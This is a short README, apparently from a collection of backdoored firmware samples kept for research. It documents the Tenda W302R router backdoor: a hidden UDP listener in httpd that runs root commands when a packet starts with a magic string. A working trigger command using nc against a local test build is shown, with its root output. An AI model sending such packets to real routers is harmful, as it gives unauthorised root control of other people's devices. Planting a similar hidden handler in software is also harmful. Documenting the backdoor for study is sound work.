# Tenda W302R backdoor
- **Type**: hidden command, hardcoded credentials
- **Affected versions**: 3.1.192 - 3.1.202


## Backdoor
he backdoor is found in the executable `/bin/httpd` in the firmware. It is an HTTP server that
seems to be based on [GoAhead](https://www.embedthis.com/goahead/) v2.1.8. The server itself starts
a separate thread, creating a UDP socket bound to port 7329 or 24151 (depending on the router
model). That socket listens for incoming packets starting with the magic string `"w302r_mfg"` or
`"rlink_mfg"` (depending on the router model), and then interprets the rest of the packet as a
command:
- `0x65`: ping the backdoor socket
- `0x31`: run an `iwpriv` command
- `0x78`: run any command as root


## Triggering the backdoor
First, we need to copy the file used as a stand-in for the actual NVRAM to `/tmp`:
```console
$ cp ./original/vendors/Ralink/RT3052/RT2860_default_vlan /tmp/
```
Then, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
```console
$ ./backdoored/user/goahead/src/goahead
```
In a separate terminal, we can trigger the backdoor (e.g., to run `id` as root):
```console
$ echo -en "rlink_mfg x /bin/id" | nc -u localhost 24151
uid=0(root) gid=0(root) groups=0(root)
```


## Reference
<https://web.archive.org/web/20131020145741/http://www.devttys0.com/2013/10/from-china-with-love>
